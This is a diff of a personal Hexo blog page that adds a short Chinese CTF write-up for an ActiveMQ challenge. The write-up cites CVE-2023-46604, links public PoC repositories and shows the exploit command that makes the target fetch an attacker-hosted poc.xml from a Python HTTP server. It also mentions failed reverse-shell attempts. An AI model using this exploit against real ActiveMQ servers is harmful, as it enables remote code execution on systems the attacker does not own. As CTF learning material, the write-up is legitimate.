@@ -20,16 +20,20 @@
     var CONFIG = {"hostname":"ha0-y.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":18,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="personal blog">
-<meta property="og:url" content="https://ha0-y.github.io/tags/shell/index.html">
+  <meta name="description" content="看到WP的我大吃一惊">
+<meta property="og:type" content="website">
+<meta property="og:title" content="RW体验赛">
+<meta property="og:url" content="https://ha0-y.github.io/todo/RW%E4%BD%93%E9%AA%8C%E8%B5%9B.html">
 <meta property="og:site_name" content="personal blog">
+<meta property="og:description" content="看到WP的我大吃一惊">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-01-28T10:59:47.911Z">
+<meta property="article:modified_time" content="2024-01-28T10:59:47.911Z">
 <meta property="article:author" content="Ha0Y">
 <meta property="article:tag" content="Blog">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://ha0-y.github.io/tags/shell/">
+<link rel="canonical" href="https://ha0-y.github.io/todo/RW%E4%BD%93%E9%AA%8C%E8%B5%9B">
 
 
 <script id="page-configurations">
@@ -42,7 +46,8 @@
   };
 </script>
 
-  <title>标签: shell | personal blog</title>
+  <title>RW体验赛 | personal blog
+</title>
   
 
 
@@ -170,54 +175,62 @@
       <div class="main-inner">
         <div class="content-wrap">
           
+  
+  
 
-          <div class="content tag">
+          <div class="content page posts-expand">
             
 
+    
+    
+    
+    <div class="post-block" lang="zh-CN">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline">RW体验赛
+</h1>
+
+<div class="post-meta">
   
-  
-  
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <h2 class="collection-header">shell
-          <small>标签</small>
-        </h2>
-      </div>
+
+</div>
+
+</header>
 
       
-    <div class="collection-year">
-      <span class="collection-header">2023</span>
-    </div>
+      
+      
+      <div class="post-body">
+          <blockquote>
+<p>看到WP的我大吃一惊</p>
+</blockquote>
+<span id="more"></span>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+<h2 id="Be-an-ActiveMq-Hacker"><a href="#Be-an-ActiveMq-Hacker" class="headerlink" title="Be-an-ActiveMq-Hacker"></a>Be-an-ActiveMq-Hacker</h2><p>给了Dockerfile，首先在本地试试。提示给的是 <code>CVE-2023-46604</code>，直接搜索CVE的PoC就行。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/X1r0z/ActiveMQ-RCE">ActiveMQ RCE CVE-2023-46604</a></li>
+</ul>
+<p>python启动一个http服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m http.server 8000</span><br></pre></td></tr></table></figure>
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2023-06-19T10:54:28+08:00"
-              content="2023-06-19">
-          06-19
-        </time>
+<p>touch 文件失败？然后尝试反弹shell，也失败了？</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/evkl1d/CVE-2023-46604">evkl1d&#x2F;CVE-2023-46604</a></li>
+</ul>
+<p>赛后看WP，猛然意识到不该使用 <code>127.0.0.1</code> 这个IP，而是应该 <code>ifconfig</code> 后的IP。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 错误的🤡</span></span><br><span class="line">$ python exploit.py -i 127.0.0.1 -p 61616 -u http://127.0.0.1:8000/poc.xml</span><br><span class="line"><span class="comment"># 正确的</span></span><br><span class="line">$ python exploit.py -i 127.0.0.1 -p 61616 -u http://&lt;ip&gt;:8000/poc.xml</span><br></pre></td></tr></table></figure>
+
+<h2 id="vision"><a href="#vision" class="headerlink" title="vision"></a>vision</h2>
       </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2023/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%B8%80%E8%AF%BE/" itemprop="url">
-            <span itemprop="name">计算机教育缺失的一课</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
+      
+      
+      
     </div>
-  </div>
-  
-  
-  
+    
 
-  
-
+    
+    
+    
 
 
           </div>
@@ -268,6 +281,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Be-an-ActiveMq-Hacker"><span class="nav-number">1.</span> <span class="nav-text">Be-an-ActiveMq-Hacker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vision"><span class="nav-number">2.</span> <span class="nav-text">vision</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
